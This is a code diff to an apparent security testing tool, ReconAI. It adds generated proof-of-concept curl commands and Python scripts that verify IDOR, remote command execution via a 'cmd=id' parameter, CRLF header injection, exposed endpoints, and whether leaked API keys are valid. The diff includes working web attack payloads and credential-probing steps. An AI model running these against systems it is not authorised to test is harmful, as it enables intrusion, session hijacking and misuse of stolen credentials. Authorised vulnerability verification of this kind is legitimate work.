@@ -356,6 +356,7 @@ for engine, payload in PAYLOADS.items():
         return PoC(
             vulnerability=title,
             target=target,
+            curl_command=f'curl -sk -H "Cookie: session=REPLACE_COOKIE" "{target}" | grep -E "(user_id|account|profile|email|admin)"',
             python_script=f'''#!/usr/bin/env python3
 """IDOR Enumeration PoC — ReconAI Generated
 IMPORTANT: Only run against your OWN accounts or with written authorization.
@@ -443,6 +444,7 @@ print("[-] No LFI detected in common params")
         return PoC(
             vulnerability=title,
             target=target,
+            curl_command=f'curl -sk "{target}?cmd=id" | grep -E "(uid=[0-9]+|gid=[0-9]+|groups=)"',
             python_script=f'''#!/usr/bin/env python3
 """RCE Verification PoC — ReconAI Generated
 SAFE: Uses `id` command only — no reverse shell, no persistence.
@@ -569,13 +571,35 @@ else:
             vulnerability=title,
             target=target,
             curl_command=f'curl -sk -I "{target}?q=%0d%0aX-Injected-Header:pwned" | grep -i injected',
+            python_script=f'''#!/usr/bin/env python3
+"""CRLF Injection Verification PoC — ReconAI Generated"""
+import requests
+requests.packages.urllib3.disable_warnings()
+
+TARGET = "{target}"
+payload = "%0d%0aSet-Cookie: reconai_canary=1"
+try:
+    r = requests.get(f"{{TARGET}}?param={{payload}}", timeout=10, verify=False, allow_redirects=False)
+    if "reconai_canary" in r.headers.get("Set-Cookie", ""):
+        print("[CONFIRMED] CRLF Injection — Injected header set in response!")
+    else:
+        print("[-] Injected header not reflected in Set-Cookie.")
+except Exception as e:
+    print(f"[-] Connection error: {{e}}")
+''',
             impact_description="CRLF injection allows injecting HTTP headers, enabling session fixation, XSS via header injection, and HTTP response splitting.",
+            verification_steps=[
+                "1. Send request with %0d%0a carriage-return newline sequences",
+                "2. Check response headers for injected HTTP headers or cookies",
+                "3. If Set-Cookie or custom header is reflected, CRLF injection is confirmed",
+            ],
         )
 
     def _gen_secret_verify(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
         return PoC(
             vulnerability=title,
             target=target,
+            curl_command=f'curl -sk -H "Authorization: Bearer REPLACE_WITH_DISCOVERED_KEY" "{target}" | head -30',
             python_script=f'''#!/usr/bin/env python3
 """Exposed Secret Verification PoC — ReconAI Generated
 Verifies that an exposed API key/credential is VALID (without using it destructively).
@@ -602,6 +626,11 @@ except Exception as e:
     print(f"Not AWS or error: {{e}}")
 ''',
             impact_description="Exposed credentials grant direct access to the service. An attacker can use them to access data, services, or cloud infrastructure directly.",
+            verification_steps=[
+                "1. Verify key format and corresponding provider",
+                "2. Submit benign read-only identity probe (e.g. sts get-caller-identity or /user endpoint)",
+                "3. Confirm key validity without performing destructive actions",
+            ],
         )
 
     def _gen_exposed_endpoint(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
@@ -609,7 +638,29 @@ except Exception as e:
             vulnerability=title,
             target=target,
             curl_command=f'curl -sk -v "{target}" 2>&1 | head -40',
+            python_script=f'''#!/usr/bin/env python3
+"""Exposed Endpoint Verification PoC — ReconAI Generated"""
+import requests
+requests.packages.urllib3.disable_warnings()
+
+TARGET = "{target}"
+try:
+    r = requests.get(TARGET, timeout=10, verify=False)
+    print(f"Status: {{r.status_code}} | Length: {{len(r.content)}} bytes")
+    if r.status_code == 200:
+        print("[CONFIRMED] Sensitive endpoint accessible without authentication!")
+        print(r.text[:500])
+    else:
+        print(f"[-] Status code: {{r.status_code}}")
+except Exception as e:
+    print(f"[-] Error: {{e}}")
+''',
             impact_description="An exposed sensitive endpoint may leak configuration, user data, or provide unauthorized access to administrative functions.",
+            verification_steps=[
+                f"1. Send GET request to: {target}",
+                "2. Check if HTTP 200 OK is returned without requiring authentication credentials",
+                "3. Review response body for exposed tokens, internal APIs, or PII",
+            ],
         )
 
     def _gen_subdomain_takeover(self, title: str, target: str, finding: dict, cve: dict) -> PoC:
